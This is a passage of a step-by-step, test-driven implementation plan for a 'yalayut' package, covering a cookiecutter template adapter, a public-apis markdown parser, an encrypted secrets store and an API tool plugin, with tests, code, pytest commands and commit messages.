                    error=f"yalayut_recipe: {res.get('reason') or 'recipe failed'}",
                    result=res,
                )
            return Action(status="completed", result=res)
        except Exception as e:
            return Action(status="failed", error=str(e))
```

- [ ] Run the full executor test file — expect PASS:
  `timeout 60 pytest packages/mr_roboto/tests/test_yalayut_recipe_executor.py -p no:cacheprovider`
  Expected: 3 passed.

- [ ] Commit: `feat(mr_roboto): register yalayut_recipe mechanical executor for preempt lane`

---

## Task 5 — `cookiecutter_template` discovery adapter

Mechanical adapter: fetch a cookiecutter repo's `cookiecutter.json`, build a
`shell_recipe` manifest with `inputs_schema` lifted from the JSON and a single
`uvx cookiecutter gh:<owner>/<repo>` invocation step. No LLM.

**Files:**
- Create: `packages/yalayut/src/yalayut/discovery/sources/cookiecutter_template.py`
- Create: `packages/yalayut/tests/fixtures/cookiecutter.json`
- Test: `packages/yalayut/tests/test_adapter_cookiecutter.py`

**Steps:**

- [ ] Create `packages/yalayut/tests/fixtures/cookiecutter.json`:

```json
{
  "project_name": "My Awesome Project",
  "project_slug": "{{ cookiecutter.project_name.lower().replace(' ', '_') }}",
  "author_name": "Your Name",
  "use_celery": "n",
  "open_source_license": ["MIT", "BSD-3-Clause", "Not open source"],
  "_copy_without_render": ["docs/*"]
}
```

- [ ] Create `packages/yalayut/tests/test_adapter_cookiecutter.py`:

```python
"""cookiecutter_template adapter — cookiecutter.json -> manifest."""
import json
from pathlib import Path

import pytest

from yalayut.discovery.sources.cookiecutter_template import (
    cookiecutter_json_to_manifest,
    CookiecutterAdapter,
)

FIXTURE = Path(__file__).parent / "fixtures" / "cookiecutter.json"


def test_manifest_basic_shape():
    cc_json = json.loads(FIXTURE.read_text())
    m = cookiecutter_json_to_manifest(
        cc_json, owner="cookiecutter", repo="cookiecutter-django"
    )
    assert m["artifact_type"] == "skill"
    assert m["kind"] == "shell_recipe"
    assert m["mechanizable"] is True
    assert m["name"] == "cc-django"          # cookiecutter- prefix stripped
    assert m["name_original"] == "cookiecutter-django"
    assert m["owner"] == "cookiecutter"
    assert m["source"] == "github:cookiecutter/cookiecutter-django"


def test_invocation_step_built():
    cc_json = json.loads(FIXTURE.read_text())
    m = cookiecutter_json_to_manifest(cc_json, owner="foo", repo="cookiecutter-bar")
    steps = m["invocation"]["steps"]
    assert len(steps) == 1
    assert steps[0]["cmd"] == "uvx cookiecutter --no-input gh:foo/cookiecutter-bar"


def test_inputs_schema_lifted():
    cc_json = json.loads(FIXTURE.read_text())
    m = cookiecutter_json_to_manifest(cc_json, owner="foo", repo="cookiecutter-bar")
    schema = m["inputs_schema"]
    # Private keys (underscore-prefixed) are dropped.
    assert "_copy_without_render" not in schema
    # Plain string var.
    assert schema["project_name"]["type"] == "string"
    assert schema["project_name"]["default"] == "My Awesome Project"
    # Boolean-ish y/n var inferred as bool.
    assert schema["use_celery"]["type"] == "bool"
    assert schema["use_celery"]["default"] is False
    # List var -> choice.
    assert schema["open_source_license"]["type"] == "choice"
    assert schema["open_source_license"]["choices"][0] == "MIT"
    assert schema["open_source_license"]["default"] == "MIT"
    # Jinja-templated var is skipped (derived, not an input).
    assert "project_slug" not in schema


def test_name_no_double_prefix():
    # repo already 'cookiecutter-' prefixed -> single 'cc-' canonical.
    m = cookiecutter_json_to_manifest({}, owner="x", repo="cookiecutter-data-science")
    assert m["name"] == "cc-data-science"
    # repo without the prefix still gets a cc- canonical.
    m2 = cookiecutter_json_to_manifest({}, owner="x", repo="flask-template")
    assert m2["name"] == "cc-flask-template"


@pytest.mark.asyncio
async def test_adapter_discover_parses_fixture(monkeypatch):
    adapter = CookiecutterAdapter()

    async def fake_fetch_json(owner, repo):
        return json.loads(FIXTURE.read_text())

    monkeypatch.setattr(adapter, "_fetch_cookiecutter_json", fake_fetch_json)
    refs = await adapter.discover(
        {"source_id": "github:cookiecutter/cookiecutter-django",
         "owner": "cookiecutter", "repo": "cookiecutter-django"}
    )
    assert len(refs) == 1
    assert refs[0]["manifest"]["name"] == "cc-django"
```

- [ ] Run it — expect FAIL:
  `timeout 60 pytest packages/yalayut/tests/test_adapter_cookiecutter.py -p no:cacheprovider`
  Expected: `ModuleNotFoundError`.

- [ ] Create `packages/yalayut/src/yalayut/discovery/sources/cookiecutter_template.py`:

```python
"""cookiecutter_template discovery adapter.

Mechanical (no LLM). For a cookiecutter template repo, fetch its
``cookiecutter.json`` from GitHub raw and synthesize a yalayut ``shell_recipe``
manifest: the ``inputs_schema`` is lifted directly from the JSON variables and
the invocation is a single ``uvx cookiecutter --no-input gh:<owner>/<repo>``.

Recon confirmed cookiecutter.json IS the input schema; there is no YAML
frontmatter to parse. Confidence 0.85.
"""
from __future__ import annotations

import json
from typing import Any

import aiohttp

from src.infra.logging_config import get_logger

logger = get_logger("yalayut.adapter.cookiecutter")

_RAW_URL = "https://raw.githubusercontent.com/{owner}/{repo}/HEAD/cookiecutter.json"


def _canonical_name(repo: str) -> str:
    """``cookiecutter-django`` -> ``cc-django``; ``flask-x`` -> ``cc-flask-x``."""
    base = repo
    if base.startswith("cookiecutter-"):
        base = base[len("cookiecutter-"):]
    base = base.strip("-") or "template"
    return f"cc-{base}"


def _infer_field(key: str, value: Any) -> dict[str, Any] | None:
    """Map one cookiecutter.json entry to an inputs_schema field.

    Returns ``None`` for entries that are not user inputs (private keys, and
    Jinja-templated derived values).
    """
    if key.startswith("_"):
        return None
    if isinstance(value, list):
        # cookiecutter list = choice; first element is the default.
        choices = [str(v) for v in value]
        return {
            "type": "choice",
            "choices": choices,
            "default": choices[0] if choices else None,
        }
    if isinstance(value, bool):
        return {"type": "bool", "default": value}
    if isinstance(value, str):
        # A Jinja expression ({{ ... }}) is a derived slug, not an input.
        if "{{" in value and "}}" in value:
            return None
        # y/n strings are cookiecutter's boolean idiom.
        if value.strip().lower() in ("y", "n", "yes", "no"):
            return {"type": "bool",
                    "default": value.strip().lower() in ("y", "yes")}
        return {"type": "string", "default": value}
    if isinstance(value, (int, float)):
        return {"type": "number", "default": value}
    return {"type": "string", "default": str(value)}


def cookiecutter_json_to_manifest(
    cc_json: dict[str, Any], owner: str, repo: str
) -> dict[str, Any]:
    """Synthesize a shell_recipe manifest from a parsed cookiecutter.json."""
    inputs_schema: dict[str, Any] = {}
    for key, value in (cc_json or {}).items():
        field = _infer_field(key, value)
        if field is not None:
            inputs_schema[key] = field

    return {
        "name": _canonical_name(repo),
        "name_original": repo,
        "version": "1.0.0",
        "artifact_type": "skill",
        "kind": "shell_recipe",
        "source": f"github:{owner}/{repo}",
        "owner": owner,
        "license": None,
        "mechanizable": True,
        "model_hint": None,
        "intent_keywords": [w for w in repo.replace("cookiecutter-", "").split("-")
                            if w],
        "inputs_schema": inputs_schema,
        "invocation": {
            "steps": [
                {"cmd": f"uvx cookiecutter --no-input gh:{owner}/{repo}"}
            ]
        },
        "artifacts": [],
        "disabled_imports_check": True,
    }


class CookiecutterAdapter:
    """SourceAdapter for individual cookiecutter template repos."""

    source_type = "cookiecutter_template"

    async def _fetch_cookiecutter_json(
        self, owner: str, repo: str
    ) -> dict[str, Any]:
        url = _RAW_URL.format(owner=owner, repo=repo)
        async with aiohttp.ClientSession() as session:
            async with session.get(
                url, timeout=aiohttp.ClientTimeout(total=15)
            ) as resp:
                if resp.status != 200:
                    raise RuntimeError(
                        f"cookiecutter.json fetch HTTP {resp.status} for {owner}/{repo}"
                    )
                text = await resp.text()
        return json.loads(text)

    async def discover(self, source_cfg: dict[str, Any]) -> list[dict[str, Any]]:
        """Return a single ArtifactRef (one repo = one shell_recipe)."""
        owner = source_cfg.get("owner")
        repo = source_cfg.get("repo")
        if not owner or not repo:
            logger.warning("cookiecutter source_cfg missing owner/repo",
                            cfg=source_cfg)
            return []
        try:
            cc_json = await self._fetch_cookiecutter_json(owner, repo)
        except Exception as e:
            logger.warning("cookiecutter.json discovery failed",
                            owner=owner, repo=repo, err=str(e))
            return []
        manifest = cookiecutter_json_to_manifest(cc_json, owner=owner, repo=repo)
        return [{
            "source_id": source_cfg.get("source_id", f"github:{owner}/{repo}"),
            "name": manifest["name"],
            "manifest": manifest,
            "body": "",
        }]

    async def fetch(self, ref: dict[str, Any]):
        """No body to fetch — cookiecutter recipes are pure invocation."""
        return None
```

- [ ] Run it — expect PASS:
  `timeout 60 pytest packages/yalayut/tests/test_adapter_cookiecutter.py -p no:cacheprovider`
  Expected: 5 passed.

- [ ] Commit: `feat(yalayut): cookiecutter_template discovery adapter (cookiecutter.json -> manifest)`

---

## Task 6 — `public_apis_md` discovery adapter

Mechanical adapter: parse a public-apis markdown table
(`API | Description | Auth | HTTPS | CORS`) into a list of `api` manifests. No
LLM. No-auth rows → T0-eligible; auth rows carry `auth_env`.

**Files:**
- Create: `packages/yalayut/src/yalayut/discovery/sources/public_apis_md.py`
- Create: `packages/yalayut/tests/fixtures/public_apis_sample.md`
- Test: `packages/yalayut/tests/test_adapter_public_apis.py`

**Steps:**

- [ ] Create `packages/yalayut/tests/fixtures/public_apis_sample.md`:

```markdown
### Cryptocurrency

API | Description | Auth | HTTPS | CORS
|---|---|---|---|---|
| [CoinGecko](https://www.coingecko.com/api/documentation) | Cryptocurrency Price, Market, and Developer/Social Data | No | Yes | Yes |
| [Alpha Vantage](https://www.alphavantage.co/) | Stock and Crypto Realtime and Historical Data | `apiKey` | Yes | Unknown |

### Animals

API | Description | Auth | HTTPS | CORS
|---|---|---|---|---|
| [Cat Facts](https://catfact.ninja/) | Daily cat facts | No | Yes | No |
```

- [ ] Create `packages/yalayut/tests/test_adapter_public_apis.py`:

```python
"""public_apis_md adapter — markdown API table -> manifest list."""
from pathlib import Path

import pytest

from yalayut.discovery.sources.public_apis_md import (
    parse_public_apis_md,
    PublicApisAdapter,
)

FIXTURE = Path(__file__).parent / "fixtures" / "public_apis_sample.md"


def test_parses_all_rows():
    manifests = parse_public_apis_md(FIXTURE.read_text())
    names = {m["name"] for m in manifests}
    assert names == {"api-coingecko", "api-alpha-vantage", "api-cat-facts"}


def test_no_auth_row_shape():
    manifests = parse_public_apis_md(FIXTURE.read_text())
    cg = next(m for m in manifests if m["name"] == "api-coingecko")
    assert cg["artifact_type"] == "api"
    assert cg["name_original"] == "CoinGecko"
    assert cg["api"]["auth_type"] == "none"
    assert cg["api"]["auth_env"] is None
    assert cg["api"]["base_url"].startswith("https://")


def test_apikey_row_carries_auth_env():
    manifests = parse_public_apis_md(FIXTURE.read_text())
    av = next(m for m in manifests if m["name"] == "api-alpha-vantage")
    assert av["api"]["auth_type"] == "apikey"
    # auth_env derived from canonical name, uppercased.
    assert av["api"]["auth_env"] == "ALPHA_VANTAGE_API_KEY"


def test_intent_keywords_from_description():
    manifests = parse_public_apis_md(FIXTURE.read_text())
    cg = next(m for m in manifests if m["name"] == "api-coingecko")
    assert "cryptocurrency" in cg["intent_keywords"]


@pytest.mark.asyncio
async def test_adapter_discover(monkeypatch):
    adapter = PublicApisAdapter()

    async def fake_fetch(url):
        return FIXTURE.read_text()

    monkeypatch.setattr(adapter, "_fetch_md", fake_fetch)
    refs = await adapter.discover({"source_id": "github:public-apis/public-apis",
                                   "endpoint": "https://example/README.md"})
    assert len(refs) == 3
    assert all(r["manifest"]["artifact_type"] == "api" for r in refs)
```

- [ ] Run it — expect FAIL:
  `timeout 60 pytest packages/yalayut/tests/test_adapter_public_apis.py -p no:cacheprovider`
  Expected: `ModuleNotFoundError`.

- [ ] Create `packages/yalayut/src/yalayut/discovery/sources/public_apis_md.py`:

```python
"""public_apis_md discovery adapter.

Mechanical (no LLM). Parses the public-apis/public-apis README markdown tables
(``API | Description | Auth | HTTPS | CORS``) into ``api`` artifact manifests.
Recon confirmed this is the cleanest non-frontmatter source; confidence 0.9.
"""
from __future__ import annotations

import re
from typing import Any

import aiohttp

from src.infra.logging_config import get_logger

logger = get_logger("yalayut.adapter.public_apis")

# Markdown link in the API cell: [Name](url)
_LINK_RE = re.compile(r"\[([^\]]+)\]\(([^)]+)\)")
# A markdown table data row: starts and ends with a pipe.
_ROW_RE = re.compile(r"^\|(.+)\|\s*$")
# Separator row: |---|---| ...
_SEP_RE = re.compile(r"^\|[\s:|-]+\|\s*$")

_STOPWORDS = frozenset(
    {"and", "or", "the", "a", "an", "for", "with", "data", "api", "to", "of",
     "in", "on", "your", "this", "free", "realtime", "historical"}
)


def _slugify_name(raw: str) -> str:
    """``CoinGecko`` -> ``api-coingecko``; ``Alpha Vantage`` -> ``api-alpha-vantage``."""
    base = re.sub(r"[^a-z0-9]+", "-", raw.strip().lower()).strip("-")
    return f"api-{base or 'unknown'}"


def _auth_env_var(canonical_name: str) -> str:
    """``api-alpha-vantage`` -> ``ALPHA_VANTAGE_API_KEY``."""
    stem = canonical_name[len("api-"):] if canonical_name.startswith("api-") else canonical_name
    return re.sub(r"[^A-Z0-9]+", "_", stem.upper()).strip("_") + "_API_KEY"


def _intent_keywords(description: str) -> list[str]:
    tokens = re.findall(r"[a-z]{3,}", description.lower())
    seen: list[str] = []
    for tok in tokens:
        if tok not in _STOPWORDS and tok not in seen:
            seen.append(tok)
    return seen[:8]


def _classify_auth(auth_cell: str) -> tuple[str, bool]:
    """Return (auth_type, requires_key). auth_type in {none, apikey, oauth}."""
    cell = auth_cell.strip().strip("`").lower()
    if cell in ("", "no", "none"):
        return "none", False
    if "oauth" in cell:
        return "oauth", True
    return "apikey", True


def _parse_row(cells: list[str]) -> dict[str, Any] | None:
    """Parse one table data row into an api manifest, or None if malformed."""
    if len(cells) < 5:
        return None
    api_cell, desc, auth_cell, https_cell, _cors = cells[:5]
    m = _LINK_RE.search(api_cell)
    if not m:
        return None
    name_original, url = m.group(1).strip(), m.group(2).strip()
    canonical = _slugify_name(name_original)
    auth_type, requires_key = _classify_auth(auth_cell)
    https = https_cell.strip().lower() in ("yes", "true")
    base_url = url
    if not base_url.startswith("http"):
        base_url = "https://" + base_url

    return {
        "name": canonical,
        "name_original": name_original,
        "version": "1.0.0",
        "artifact_type": "api",
        "kind": None,
        "source": "github:public-apis/public-apis",
        "owner": "public-apis",
        "license": None,
        "mechanizable": False,
        "model_hint": None,
        "intent_keywords": _intent_keywords(desc),
        "api": {
            "base_url": base_url,
            "doc_url": url,
            "auth_type": auth_type,
            "auth_env": _auth_env_var(canonical) if requires_key else None,
            "https": https,
            "description": desc.strip(),
        },
        "disabled_imports_check": True,
    }


def parse_public_apis_md(md_text: str) -> list[dict[str, Any]]:
    """Parse every API table row in a public-apis README into manifests."""
    manifests: list[dict[str, Any]] = []
    for line in md_text.splitlines():
        line = line.rstrip()
        if _SEP_RE.match(line):
            continue
        row = _ROW_RE.match(line)
        if not row:
            continue
        cells = [c.strip() for c in row.group(1).split("|")]
        # Header row ("API | Description | Auth | ...") has no markdown link.
        if not _LINK_RE.search(cells[0]):
            continue
        manifest = _parse_row(cells)
        if manifest is not None:
            manifests.append(manifest)
    return manifests


class PublicApisAdapter:
    """SourceAdapter for the public-apis/public-apis README."""

    source_type = "public_apis_md"

    async def _fetch_md(self, url: str) -> str:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                url, timeout=aiohttp.ClientTimeout(total=20)
            ) as resp:
                if resp.status != 200:
                    raise RuntimeError(f"public-apis fetch HTTP {resp.status}")
                return await resp.text()

    async def discover(self, source_cfg: dict[str, Any]) -> list[dict[str, Any]]:
        endpoint = source_cfg.get("endpoint")
        if not endpoint:
            logger.warning("public_apis source_cfg missing endpoint", cfg=source_cfg)
            return []
        try:
            md_text = await self._fetch_md(endpoint)
        except Exception as e:
            logger.warning("public-apis discovery failed", err=str(e))
            return []
        refs: list[dict[str, Any]] = []
        for manifest in parse_public_apis_md(md_text):
            refs.append({
                "source_id": source_cfg.get("source_id",
                                             "github:public-apis/public-apis"),
                "name": manifest["name"],
                "manifest": manifest,
                "body": "",
            })
        return refs

    async def fetch(self, ref: dict[str, Any]):
        return None
```

- [ ] Run it — expect PASS:
  `timeout 60 pytest packages/yalayut/tests/test_adapter_public_apis.py -p no:cacheprovider`
  Expected: 5 passed.

- [ ] Commit: `feat(yalayut): public_apis_md discovery adapter (markdown table -> api manifests)`

---

## Task 7 — Secrets store + `env_status` lifecycle

fernet-encrypted secret storage in `yalayut_secrets` and an `env_status`
calculator that yalayut/intersect use to filter artifacts missing auth env.

**Files:**
- Create: `packages/yalayut/src/yalayut/secrets.py`
- Modify: `.env.example`
- Test: `packages/yalayut/tests/test_secrets.py`

**Steps:**

- [ ] Create `packages/yalayut/tests/test_secrets.py`:

```python
"""yalayut.secrets — fernet round-trip + env_status."""
import os

import pytest

from yalayut import secrets as ysec


@pytest.fixture(autouse=True)
def _fernet_key(monkeypatch):
    # A valid 32-byte url-safe base64 fernet key for tests.
    from cryptography.fernet import Fernet
    monkeypatch.setenv("YALAYUT_SECRET_KEY", Fernet.generate_key().decode())


@pytest.mark.asyncio
async def test_set_and_get_secret_round_trip(tmp_path, monkeypatch):
    rows = {}

    async def fake_upsert(key, blob):
        rows[key] = blob

    async def fake_fetch(key):
        return rows.get(key)

    monkeypatch.setattr(ysec, "_db_upsert_secret", fake_upsert)
    monkeypatch.setattr(ysec, "_db_fetch_secret", fake_fetch)

    await ysec.set_secret("OPENAQ_API_KEY", "super-secret-value")
    got = await ysec.get_secret("OPENAQ_API_KEY")
    assert got == "super-secret-value"
    # Stored blob is NOT plaintext.
    assert b"super-secret-value" not in rows["OPENAQ_API_KEY"]


@pytest.mark.asyncio
async def test_get_missing_secret_returns_none(monkeypatch):
    async def fake_fetch(key):
        return None
    monkeypatch.setattr(ysec, "_db_fetch_secret", fake_fetch)
    assert await ysec.get_secret("NOPE_KEY") is None


@pytest.mark.asyncio
async def test_env_status_ready_when_env_present(monkeypatch):
    monkeypatch.setenv("PRESENT_KEY", "x")
    monkeypatch.setattr(ysec, "get_secret", _async_none)
    status = await ysec.compute_env_status(["PRESENT_KEY"])
    assert status == "ready"


@pytest.mark.asyncio
async def test_env_status_ready_when_secret_present(monkeypatch):
    monkeypatch.delenv("VAULT_KEY", raising=False)

    async def fake_get_secret(key):
        return "from-vault" if key == "VAULT_KEY" else None

    monkeypatch.setattr(ysec, "get_secret", fake_get_secret)
    status = await ysec.compute_env_status(["VAULT_KEY"])
    assert status == "ready"


@pytest.mark.asyncio
async def test_env_status_missing(monkeypatch):
    monkeypatch.delenv("ABSENT_KEY", raising=False)
    monkeypatch.setattr(ysec, "get_secret", _async_none)
    status = await ysec.compute_env_status(["ABSENT_KEY"])
    assert status == "missing_ABSENT_KEY"


@pytest.mark.asyncio
async def test_env_status_no_keys_is_ready(monkeypatch):
    assert await ysec.compute_env_status([]) == "ready"
    assert await ysec.compute_env_status(None) == "ready"


async def _async_none(key):
    return None
```

- [ ] Run it — expect FAIL:
  `timeout 60 pytest packages/yalayut/tests/test_secrets.py -p no:cacheprovider`
  Expected: `ModuleNotFoundError`.

- [ ] Create `packages/yalayut/src/yalayut/secrets.py`:

```python
"""yalayut.secrets — fernet-encrypted auth secret store + env_status lifecycle.

API and MCP artifacts declare ``auth_env`` / ``mcp.env_required``. yalayut needs
to know whether the required keys are available so it can:

  * write ``env_status`` ('ready' | 'missing_<KEY>') on ``yalayut_index`` at
    vet time and on a daily re-check;
  * let intersect filter artifacts whose ``env_status != 'ready'`` at match
    time.

A key is "available" if it is present in ``os.environ`` OR stored (encrypted)
in the ``yalayut_secrets`` table. Founder writes via ``/yalayut auth set`` →
``set_secret``. Encryption uses ``cryptography.fernet`` with the key in ``.env``
under ``YALAYUT_SECRET_KEY``.
"""
from __future__ import annotations

import os
from datetime import datetime
from typing import Any

from src.infra.logging_config import get_logger

logger = get_logger("yalayut.secrets")

_SECRET_KEY_ENV = "YALAYUT_SECRET_KEY"


class SecretsError(RuntimeError):
    """Raised when the secrets store cannot operate (missing fernet key)."""


def _fernet():
    """Build a Fernet instance from the env key. Raises if absent/invalid."""
    from cryptography.fernet import Fernet

    raw = os.getenv(_SECRET_KEY_ENV)
    if not raw:
        raise SecretsError(
            f"{_SECRET_KEY_ENV} not set in .env — cannot encrypt yalayut secrets"
        )
    try:
        return Fernet(raw.encode() if isinstance(raw, str) else raw)
    except Exception as e:
        raise SecretsError(f"{_SECRET_KEY_ENV} is not a valid fernet key: {e}") from e


async def _db_upsert_secret(key_name: str, encrypted_value: bytes) -> None:
    """Upsert one encrypted secret row. Patched in tests."""
    from src.infra.db import get_db

    db = await get_db()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    await db.execute(
        "INSERT INTO yalayut_secrets (key_name, encrypted_value, added_at) "
        "VALUES (?, ?, ?) "
        "ON CONFLICT(key_name) DO UPDATE SET encrypted_value = excluded.encrypted_value",
        (key_name, encrypted_value, now),
    )
    await db.commit()


async def _db_fetch_secret(key_name: str) -> bytes | None:
    """Fetch one encrypted secret blob. Patched in tests."""
    from src.infra.db import get_db

    db = await get_db()
    cur = await db.execute(
        "SELECT encrypted_value FROM yalayut_secrets WHERE key_name = ?",
        (key_name,),
    )
    row = await cur.fetchone()
    if row is None:
        return None
    return row[0]


async def set_secret(key_name: str, value: str) -> None:
    """Encrypt ``value`` and store it under ``key_name`` in yalayut_secrets."""
    blob = _fernet().encrypt(value.encode("utf-8"))
    await _db_upsert_secret(key_name, blob)
    logger.info("secret stored", key_name=key_name)


async def get_secret(key_name: str) -> str | None:
    """Return the decrypted secret, or ``None`` if not stored."""
    blob = await _db_fetch_secret(key_name)
    if blob is None:
        return None
    try:
        return _fernet().decrypt(bytes(blob)).decode("utf-8")
    except Exception as e:
        logger.warning("secret decrypt failed", key_name=key_name, err=str(e))
        return None


async def resolve_env(key_name: str) -> str | None:
    """Return a key's value from os.environ first, then the encrypted store."""
    val = os.getenv(key_name)
    if val:
        return val
    return await get_secret(key_name)


async def compute_env_status(required_keys: list[str] | None) -> str:
    """Return 'ready' if all keys resolve, else 'missing_<first-missing-KEY>'."""
    if not required_keys:
        return "ready"
    for key in required_keys:
        if not await resolve_env(key):
            return f"missing_{key}"
    return "ready"
```

- [ ] Run it — expect PASS:
  `timeout 60 pytest packages/yalayut/tests/test_secrets.py -p no:cacheprovider`
  Expected: 7 passed.

- [ ] Modify `.env.example` — append:

```
# yalayut: fernet key for encrypting API/MCP auth secrets in yalayut_secrets.
# Generate with: python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"
YALAYUT_SECRET_KEY=
```

- [ ] Commit: `feat(yalayut): fernet secrets store + env_status lifecycle (YALAYUT_SECRET_KEY)`

---

## Task 8 — `api` artifact plugin

The `api` AccessPlugin: builds the namespaced `tool` registration payload for an
api artifact and provides `execute_api_tool` which the coulson tool registry
calls when an agent invokes `api_<slug>__<verb>`. Execution delegates to the
existing `src/tools/free_apis.py::call_api`.

**Files:**
- Create: `packages/yalayut/src/yalayut/plugins/api.py`
- Test: `packages/yalayut/tests/test_plugin_api.py`

**Steps:**

- [ ] Create `packages/yalayut/tests/test_plugin_api.py`:

```python
"""yalayut.plugins.api — tool payload + execution."""
import pytest

from yalayut.plugins.api import ApiPlugin, execute_api_tool


def _api_row(env_status="ready"):
    return {
        "id": 21,
        "artifact_type": "api",
        "name": "api-coingecko",
        "name_original": "CoinGecko",
        "env_status": env_status,
        "manifest": {
            "name": "api-coingecko",
            "api": {
                "base_url": "https://api.coingecko.com/api/v3",
                "auth_type": "none",
                "auth_env": None,
                "verbs": [
                    {"verb": "price",
                     "endpoint": "/simple/price",
                     "params_schema": {"ids": "string", "vs_currencies": "string"}},
                ],
            },
        },
    }


def test_to_application_builds_tool_payload():
    plugin = ApiPlugin()
    app = plugin.to_application(_api_row(), task_ctx={})
    assert app["exposure_class"] == "tool"
    payload = app["payload"]
    assert payload["kind"] == "api"
    # Namespaced tool name: <artifact_slug>__<verb>, double underscore.
    assert payload["tools"][0]["tool_name"] == "api_coingecko__price"
    assert payload["tools"][0]["base_url"].endswith("/api/v3")
    assert payload["tools"][0]["endpoint"] == "/simple/price"


def test_to_application_empty_when_env_missing():
    plugin = ApiPlugin()
    app = plugin.to_application(_api_row(env_status="missing_X_API_KEY"),
                                task_ctx={})
    assert app["payload"]["tools"] == []
    assert app["payload"]["skipped_reason"] == "missing_X_API_KEY"


@pytest.mark.asyncio
async def test_execute_api_tool_calls_call_api(monkeypatch):
    captured = {}

    async def fake_call_api(api, endpoint=None, params=None):
        captured["endpoint"] = endpoint
        captured["params"] = params
        return '{"bitcoin": {"usd": 64000}}'

    monkeypatch.setattr("src.tools.free_apis.call_api", fake_call_api)
    tool_spec = {
        "tool_name": "api_coingecko__price",
        "base_url": "https://api.coingecko.com/api/v3",
        "endpoint": "/simple/price",
        "auth_type": "none",
        "auth_env": None,
    }
    res = await execute_api_tool(tool_spec, {"ids": "bitcoin", "vs_currencies": "usd"})
    assert res["ok"] is True
    assert "64000" in res["response"]
    assert captured["endpoint"] == "https://api.coingecko.com/api/v3/simple/price"
    assert captured["params"]["ids"] == "bitcoin"


@pytest.mark.asyncio
async def test_execute_api_tool_handles_error(monkeypatch):
    async def fake_call_api(api, endpoint=None, params=None):
        return "API error: HTTP 503"

    monkeypatch.setattr("src.tools.free_apis.call_api", fake_call_api)
    tool_spec = {"tool_name": "api_x__y", "base_url": "https://x",
                 "endpoint": "/y", "auth_type": "none", "auth_env": None}
    res = await execute_api_tool(tool_spec, {})
    assert res["ok"] is False
    assert "503" in res["error"]
```

- [ ] Run it — expect FAIL:
  `timeout 60 pytest packages/yalayut/tests/test_plugin_api.py -p no:cacheprovider`
  Expected: `ModuleNotFoundError`.

- [ ] Create `packages/yalayut/src/yalayut/plugins/api.py`:

```python
"""yalayut.plugins.api — AccessPlugin for the ``api`` artifact type.

An api artifact is exposed almost exclusively via the ``tool`` class. This
plugin renders the namespaced tool registration payload (one tool per declared
verb, ``api_<slug>__<verb>``) and provides ``execute_api_tool`` — the path an
agent's tool-call reaches. HTTP execution delegates to the existing
``src/tools/free_apis.py::call_api`` (it already handles auth-header / apikey
substitution and response truncation).
"""
from __future__ import annotations

from typing import Any

from src.infra.logging_config import get_logger

logger = get_logger("yalayut.plugin.api")


def _slug(name: str) -> str:
    """Canonical name -> tool-namespace slug. ``api-coingecko`` -> ``api_coingecko``."""
    return name.replace("-", "_")


class ApiPlugin:
    """AccessPlugin for api artifacts."""

    artifact_type = "api"

    def to_application(
        self, row: dict[str, Any], task_ctx: dict[str, Any]
    ) -> dict[str, Any]:
        """Build a SkillApplication-shaped dict for an api artifact.

        Returns the envelope entry intersect attaches to ``task['skills']``.
        When ``env_status`` is not 'ready' the tool list is empty (intersect
        also filters these at match time; this is defence in depth).
        """
        manifest = row.get("manifest") or {}
        api = manifest.get("api") or {}
        slug = _slug(row.get("name") or manifest.get("name") or "api_unknown")
        env_status = row.get("env_status", "ready")

        tools: list[dict[str, Any]] = []
        if env_status == "ready":
            base_url = api.get("base_url", "")
            auth_type = api.get("auth_type", "none")
            auth_env = api.get("auth_env")
            for verb in api.get("verbs") or []:
                vname = verb.get("verb")
                if not vname:
                    continue
                tools.append({
                    "tool_name": f"{slug}__{vname}",
                    "base_url": base_url,
                    "endpoint": verb.get("endpoint", ""),
                    "params_schema": verb.get("params_schema") or {},
                    "auth_type": auth_type,
                    "auth_env": auth_env,
                    "description": verb.get("description")
                    or api.get("description", ""),
                })

        return {
            "artifact_id": row.get("id"),
            "name": row.get("name"),
            "exposure_class": "tool",
            "applies_to": "execution",
            "render": None,
            "payload": {
                "kind": "api",
                "tools": tools,
                "skipped_reason": None if env_status == "ready" else env_status,
            },
            "confidence": float(task_ctx.get("_confidence", 0.0)),
        }

    def bind_args(self, row: dict[str, Any], task_ctx: dict[str, Any]) -> dict | None:
        """api artifacts are not parametric recipes — no static binding."""
        return None

    async def execute(
        self, row: dict[str, Any], task_ctx: dict[str, Any], inputs: dict[str, Any]
    ) -> dict[str, Any]:
        """Single-tool convenience execute (not on the hot path; tests/CLI)."""
        manifest = row.get("manifest") or {}
        api = manifest.get("api") or {}
        verbs = api.get("verbs") or []
        if not verbs:
            return {"ok": False, "error": "api artifact declares no verbs"}
        tool_spec = {
            "tool_name": f"{_slug(row.get('name', 'api'))}__{verbs[0]['verb']}",
            "base_url": api.get("base_url", ""),
            "endpoint": verbs[0].get("endpoint", ""),
            "auth_type": api.get("auth_type", "none"),
            "auth_env": api.get("auth_env"),
        }
        return await execute_api_tool(tool_spec, inputs)


async def execute_api_tool(
    tool_spec: dict[str, Any], params: dict[str, Any]
) -> dict[str, Any]:
    """Execute an api tool-call. Reached when an agent calls ``api_<slug>__<verb>``.

    ``tool_spec`` is one entry from ``ApiPlugin.to_application()['payload']['tools']``.
    Returns ``{"ok": bool, "response": str | None, "error": str | None}``.
    """
    from src.tools.free_apis import call_api

    base = (tool_spec.get("base_url") or "").rstrip("/")
    endpoint = tool_spec.get("endpoint") or ""
    full_url = base + ("/" + endpoint.lstrip("/") if endpoint else "")

    # Build a minimal FreeAPI-compatible dict for call_api (it accepts a dict).
    auth_type = tool_spec.get("auth_type", "none")
    auth_env = tool_spec.get("auth_env")
    api_dict = {
        "name": tool_spec.get("tool_name", "yalayut-api"),
        "base_url": base,
        "example_endpoint": full_url,
        "auth_type": (
            "apikey_header" if auth_type in ("apikey", "oauth") else "none"
        ),
        "env_var": auth_env,
        "key_header": None,
    }
    try:
        text = await call_api(api_dict, endpoint=full_url, params=params or {})
    except Exception as e:
        logger.warning("api tool execution raised",
                        tool=tool_spec.get("tool_name"), err=str(e))
        return {"ok": False, "response": None, "error": str(e)}

    is_error = isinstance(text, str) and text.startswith(
        ("API error", "Error:", "API timeout")
    )
    return {
        "ok": not is_error,
        "response": None if is_error else text,
        "error": text if is_error else None,
    }
```

- [ ] Run it — expect PASS:
  `timeout 60 pytest packages/yalayut/tests/test_plugin_api.py -p no:cacheprovider`
  Expected: 4 passed.

